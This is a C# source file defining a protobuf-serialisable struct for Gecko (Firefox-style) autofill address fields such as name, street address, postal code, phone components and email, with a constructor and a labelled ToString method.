

using ProtoBuf;
using System;


namespace InvokedCommon.Structs
{
	[ProtoContract]
	public struct GeckoAddressInfo
	{
		[ProtoMember(1)]
		public string name;
		[ProtoMember(2)]
		public string organization;
		[ProtoMember(3)]
		public string streetAddress;
		[ProtoMember(4)]
		public string addressLevel2;
		[ProtoMember(5)]
		public string addressLevel1;
		[ProtoMember(6)]
		public string postalCode;
		[ProtoMember(7)]
		public string country;
		[ProtoMember(8)]
		public string tel;
		[ProtoMember(9)]
		public string email;
		[ProtoMember(10)]
		public string givenName;
		[ProtoMember(11)]
		public string additionalName;
		[ProtoMember(12)]
		public string familyName;
		[ProtoMember(13)]
		public string addressLine1;
		[ProtoMember(14)]
		public string addressLine2;
		[ProtoMember(15)]
		public string addressLine3;
		[ProtoMember(16)]
		public string countryName;
		[ProtoMember(17)]
		public string telNational;
		[ProtoMember(18)]
		public string telCountryCode;
		[ProtoMember(19)]
		public string telAreaCode;
		[ProtoMember(20)]
		public string telLocal;
		[ProtoMember(21)]
		public string telLocalPrefix;
		[ProtoMember(22)]
		public string telLocalSuffix;

		public GeckoAddressInfo(
		    string _name,
		    string _organization,
		    string _streetAddress,
		    string _addressLevel2,
		    string _addressLevel1,
		    string _postalCode,
		    string _country,
		    string _tel,
		    string _email,
		    string _givenName,
		    string _additionalName,
		    string _familyName,
		    string _addressLine1,
		    string _addressLine2,
		    string _addressLine3,
		    string _countryName,
		    string _telNational,
		    string _telCountryCode,
		    string _telAreaCode,
		    string _telLocal,
		    string _telLocalPrefix,
		    string _telLocalSuffix)
		{
			this.name = _name;
			this.organization = _organization;
			this.streetAddress = _streetAddress;
			this.addressLevel2 = _addressLevel2;
			this.addressLevel1 = _addressLevel1;
			this.postalCode = _postalCode;
			this.country = _country;
			this.tel = _tel;
			this.email = _email;
			this.givenName = _givenName;
			this.additionalName = _additionalName;
			this.familyName = _familyName;
			this.addressLine1 = _addressLine1;
			this.addressLine2 = _addressLine2;
			this.addressLine3 = _addressLine3;
			this.countryName = _countryName;
			this.telNational = _telNational;
			this.telCountryCode = _telCountryCode;
			this.telAreaCode = _telAreaCode;
			this.telLocal = _telLocal;
			this.telLocalPrefix = _telLocalPrefix;
			this.telLocalSuffix = _telLocalSuffix;
		}

		public override string ToString()
		{
			return "NAME: " + this.name + Environment.NewLine + "ORGANIZATION: " + this.organization + Environment.NewLine + "STREET_ADDRESS: " + this.streetAddress + Environment.NewLine + "ADDRESS_LEVEL2: " + this.addressLevel2 + Environment.NewLine + "ADDRESS_LEVEL1: " + this.addressLevel1 + Environment.NewLine + "POSTAL_CODE: " + this.postalCode + Environment.NewLine + "COUNTRY: " + this.country + Environment.NewLine + "TEL: " + this.tel + Environment.NewLine + "EMAIL: " + this.email + Environment.NewLine + "GIVEN_NAME: " + this.givenName + Environment.NewLine + "ADDITIONAL_NAME: " + this.additionalName + Environment.NewLine + "FAMILY_NAME: " + this.familyName + Environment.NewLine + "ADDRESS_LINE1: " + this.addressLine1 + Environment.NewLine + "ADDRESS_LINE2: " + this.addressLine2 + Environment.NewLine + "ADDRESS_LINE3: " + this.addressLine3 + Environment.NewLine + "COUNTRY_NAME: " + this.countryName + Environment.NewLine + "TEL_NATIONAL: " + this.telNational + Environment.NewLine + "TEL_COUNTRY_CODE: " + this.telCountryCode + Environment.NewLine + "TEL_AREA_CODE: " + this.telAreaCode + Environment.NewLine + "TEL_LOCAL: " + this.telLocal + Environment.NewLine + "TEL_LOCAL_PREFIX: " + this.telLocalPrefix + Environment.NewLine + "TEL_LOCAL_SUFFIX: " + this.telLocalSuffix;
		}
	}
}